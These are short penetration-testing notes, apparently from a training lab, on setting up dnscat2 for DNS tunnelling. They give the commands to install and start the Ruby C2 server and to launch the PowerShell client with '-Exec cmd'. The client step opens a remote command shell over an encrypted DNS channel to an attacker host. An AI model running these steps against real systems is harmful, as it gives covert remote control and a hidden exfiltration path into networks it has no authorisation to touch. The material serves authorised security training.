- Dnscat2 is a tunneling tool that uses DNS protocol to send data between two hosts. 
- It uses an encrypted Command-&-Control (C&C or C2) channel and sends data inside TXT records within the DNS protocol.
- [dnscat2](https://github.com/iagox86/dnscat2)
- [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell)

### Cloning dnscat2 and Setting Up the Server
```shell
$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```
### Starting the dnscat2 server
```shell
$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache


Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21
```

###  Cloning dnscat2-powershell to the Attack Host
```powershell
git clone https://github.com/lukebaggett/dnscat2-powershell.git

PS C:\user> Import-Module .\dnscat2.ps1


PS C:\user> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

### Interacting with the Established Session

```shell
dnscat2> ?
dnscat2> window -i 1
```







